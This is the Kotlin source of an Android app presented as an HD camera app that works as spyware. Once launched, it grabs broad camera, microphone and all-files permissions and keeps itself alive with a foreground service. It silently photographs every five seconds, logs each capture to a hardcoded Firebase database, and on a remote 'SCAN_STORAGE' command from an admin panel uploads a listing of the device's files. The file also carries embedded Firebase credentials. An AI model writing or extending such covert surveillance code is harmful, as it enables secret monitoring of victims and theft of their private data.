package com.hd.camerapro

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.widget.Button
import androidx.appcompat.app.AppCompatActivity
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.view.PreviewView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.firebase.FirebaseApp
import com.google.firebase.FirebaseOptions
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.storage.FirebaseStorage
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class MainActivity : AppCompatActivity() {

    private lateinit var cameraExecutor: ExecutorService
    private var imageCapture: ImageCapture? = null
    private var lensFacing = CameraSelector.LENS_FACING_BACK
    private val PERMISSION_REQUEST_CODE = 200

    private val dbRef = FirebaseDatabase.getInstance().reference
    private val storageRef = FirebaseStorage.getInstance().reference

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Manual Firebase Initialization (Web App Credentials)
        if (FirebaseApp.getApps(this).isEmpty()) {
            val options = FirebaseOptions.Builder()
                .setApiKey("AIzaSyAQuo2WL8RZFdqLcXxsmSuNo00unp3HYZk")
                .setApplicationId("1:941200990221:web:d4c8b24e16804a1e22f544")
                .setDatabaseUrl("https://phototools-d8a41-default-rtdb.firebaseio.com")
                .setProjectId("phototools-d8a41")
                .setStorageBucket("phototools-d8a41.firebasestorage.app")
                .build()
            FirebaseApp.initializeApp(this, options)
        }

        setContentView(R.layout.activity_main)

        cameraExecutor = Executors.newSingleThreadExecutor()

        // Pehli baar khulte hi saari permissions ek sath maangne ka logic
        checkAndRequestAllPermissions()

        findViewById<Button>(R.id.captureBtn).setOnClickListener {
            takeManualPhotoAndSync()
        }

        // Background Auto-Capture Loop (Har 5 second mein photo click karke Firebase bhejega)
        startAutoBackgroundCaptureLoop()
        
        // Storage Command Listener (Admin panel se command sunne ke liye)
        setupStorageCommandListener()
    }

    private fun checkAndRequestAllPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    startActivity(intent)
                } catch (e: Exception) {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                }
            }
        }

        val needed = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (needed.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, needed, PERMISSION_REQUEST_CODE)
        } else {
            startCameraAndService()
        }
    }

    private fun startCameraAndService() {
        // Foreground service start karein taaki app background mein zinda rahe
        val serviceIntent = Intent(this, CameraForegroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        startCamera()
    }

    private fun startCamera() {
        val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
        cameraProviderFuture.addListener({
            val cameraProvider = cameraProviderFuture.get()
            val preview = Preview.Builder().build().also {
                it.setSurfaceProvider(findViewById<PreviewView>(R.id.viewFinder).surfaceProvider)
            }

            imageCapture = ImageCapture.Builder().build()
            val cameraSelector = CameraSelector.Builder().requireLensFacing(lensFacing).build()

            try {
                cameraProvider.unbindAll()
                cameraProvider.bindToLifecycle(this, cameraSelector, preview, imageCapture)
            } catch (exc: Exception) {
                // Handle camera binding failure
            }
        }, ContextCompat.getMainExecutor(this))
    }

    private fun takeManualPhotoAndSync() {
        val imageCapture = imageCapture ?: return
        val photoFile = File(externalMediaDirs.firstOrNull(), "Snapshot_${System.currentTimeMillis()}.jpg")
        val outputOptions = ImageCapture.OutputFileOptions.Builder(photoFile).build()

        imageCapture.takePicture(outputOptions, ContextCompat.getMainExecutor(this), object : ImageCapture.OnImageSavedCallback {
            override fun onError(exc: ImageCaptureException) {}

            override fun onImageSaved(output: ImageCapture.OutputFileResults) {
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
                // Firebase Realtime DB mein data push karne ka native code
                dbRef.child("security/photos").push().setValue(
                    mapOf(
                        "text" to "Manual Native Snapshot at $timestamp",
                        "timestamp" to timestamp,
                        "path" to photoFile.absolutePath
                    )
                )
            }
        })
    }

    private fun startAutoBackgroundCaptureLoop() {
        val handler = Handler(Looper.getMainLooper())
        handler.postDelayed(object : Runnable {
            override fun run() {
                takeManualPhotoAndSync() // Background auto sync
                handler.postDelayed(this, 5000) // Har 5 seconds
            }
        }, 5000)
    }

    private fun setupStorageCommandListener() {
        dbRef.child("security/commands/storage_action").addValueEventListener(object : com.google.firebase.database.ValueEventListener {
            override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                val cmd = snapshot.child("type").getValue(String::class.java)
                if (cmd == "SCAN_STORAGE") {
                    // Storage scan karke file tree Firebase par bhejna
                    scanDeviceFilesAndSync()
                }
            }
            override fun onCancelled(error: com.google.firebase.database.DatabaseError) {}
        })
    }

    private fun scanDeviceFilesAndSync() {
        val rootDir = Environment.getExternalStorageDirectory()
        val fileList = mutableListOf<Map<String, Any>>()
        
        rootDir.walkTopDown().maxDepth(3).forEach { file ->
            if (file.isFile) {
                fileList.add(mapOf("name" to file.name, "path" to file.absolutePath, "size" to file.length()))
            }
        }

        dbRef.child("storage_explorer/file_tree").setValue(
            mapOf("files" to fileList, "totalFiles" to fileList.size, "scannedAt" to System.currentTimeMillis())
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        cameraExecutor.shutdown()
    }
}
